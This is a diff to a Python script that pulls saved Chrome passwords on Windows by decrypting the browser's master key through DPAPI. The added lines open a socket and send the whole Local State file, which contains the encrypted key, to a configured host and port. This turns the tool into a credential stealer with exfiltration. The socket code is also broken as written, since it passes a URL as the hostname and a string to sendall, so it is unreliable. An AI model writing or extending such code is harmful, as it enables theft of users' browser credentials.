@@ -1,3 +1,4 @@
+# Imports
 import os
 import json
 import base64
@@ -7,8 +8,11 @@ import platform
 from colorama import init, Fore, Style
 import win32crypt
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-
+import socket
+# global configs
 init(autoreset=True)
+HOST = "http://localhost/"
+PORT = 8080
 
 def decrypt_dpapi(encrypted_bytes):
     # Uses the Windows DPAPI to decrypt a byte string
@@ -43,13 +47,17 @@ def _get_chrome_windows_creds():
     print(f"{Fore.GREEN}[+] Found Chrome user data at: {Fore.YELLOW}{chrome_path}")
 
     local_state_path = os.path.join(chrome_path, 'Local State')
-    print(local_state_path)
     decrypted_key = None
     try:
         with open(local_state_path, 'r', encoding='utf-8') as f:
             local_state = json.load(f)
             print(f"{Fore.YELLOW}[!] Informative: loading the local state json file.")
-            print(local_state)
+            dumped_data = json.dumps(local_state)
+            # sending the data to the server
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((HOST, PORT))
+                print(f"{Fore.YELLOW}[!]:Sending data after loading the local state json file")
+                s.sendall(dumped_data)
         encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
         encrypted_key_bytes = base64.b64decode(encrypted_key_b64)
         dpapi_key = encrypted_key_bytes[5:]
@@ -90,7 +98,6 @@ def _get_chrome_windows_creds():
             os.remove(temp_db_path)
     
     return credentials
-
 
 if __name__ == '__main__':
     if platform.system() == "Windows":
